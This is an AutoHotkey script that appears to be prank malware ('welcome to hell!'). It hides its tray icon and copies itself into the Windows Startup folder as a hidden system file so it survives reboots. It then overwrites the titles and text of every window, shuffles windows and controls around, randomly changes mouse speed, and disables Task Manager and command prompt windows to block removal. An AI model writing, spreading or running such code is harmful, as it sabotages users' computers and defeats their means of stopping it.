#NoEnv
SendMode Input
SetWorkingDir %A_ScriptDir%
#Persistent
#NoTrayIcon
 
; no boot device was here
; this code is awful, you have been warned
 
setTimer, killtaskman, 150
 
splitPath, A_scriptname, outName 
LinkFile=%A_startup%\%outName% 
IfNotExist, %LinkFile%
 FileCopy, %A_scriptFullPath%, %LinkFile%
 FilesetAttrib, +RS, %LinkFile% 
setworkingDir, %A_scriptDir%
 
Random, justafewmoreminutes, 7500, 12000 
sleep %justafewmoreminutes%
Random, forawhile, 7000, 15000
setTimer, mouse, -400
 
sleep %forawhile% 
loop
{
    i := ceil(0.01*%A_Index%)
    if (%A_Index% > 50) {
       DetectHiddenwindows, on
    }
    winget, winlist, list 
    loop, %winlist%
    {
       wid := winlist%A_Index% 
       winShow, ahk_id %wid%
       winGet, conlist, ControlList, ahk_id %wid%
       winSetTitle, ahk_id %wid%„ welcome to hell!
       WinGetPos, wX, wY,,, ahk_id %wid%
       Random, rx, -25, 25 
       Random, rY, -25, 25 
       WinMove, ahk_id %wid%„ wx+rx, wy+ry
       Loop, Parse, conlist, `n, `r
       {
           ControlSetText, %A_LoopField%, welcome to hell!, ahk_id %wid% 
           controlGetPos, cx, cY, cW, cH, %A_LoopField%, ahk_id %wid% 
           Random, rx, -10, 10
           Random, rY, -10, 10
           controlMove, %A_LoopField%, cX+rX, cY+rY,,, ahk_id %wid%
           ;sleep 1/%i%
       }
       ;sleep 10/%i%
    }
    ;sleep 50/%i%
}
 
mouse:
Random, speed, 1, 20
Dllcall("systemParametersinfo", uint, 0x71, uint, 0, Ptr, %speed%, uint, 0)
Random, wait, -250, -50 
setTimer, mouse, %wait% 
return
 
killtaskman:
IfWinExist, ahk_exe taskmgr.exe
{
    winset, Disable
}
ifwinExist, ahk_exe cmd.exe
{
    winset, Disable
}
Q & m::
Exit:
GuiClose:
Gui,Destroy
ExitApp
Return